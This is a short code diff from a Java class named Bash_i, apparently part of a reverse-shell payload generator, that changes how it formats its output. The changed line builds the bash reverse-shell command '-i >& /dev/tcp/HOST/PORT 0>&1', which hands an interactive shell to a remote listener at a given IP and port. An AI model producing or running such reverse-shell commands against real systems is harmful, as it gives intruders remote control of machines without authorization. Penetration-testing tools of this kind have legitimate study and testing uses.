@@ -7,7 +7,7 @@ public class Bash_i extends Reverse{
 
     public Bash_i(String localIP, int localPort, LISTENER listener, SHELLS shellType){
         super(localIP, localPort, listener, shellType);
-        shellFormat = String.format("\n%s -i >& /dev/tcp/%s/%s 0>&1\n", this.getShell(), this.getLocalIP(), this.getLocalPort());
+        shellFormat = String.format("%s -i >& /dev/tcp/%s/%s 0>&1", this.getShell(), this.getLocalIP(), this.getLocalPort());
     }
 
     @Override
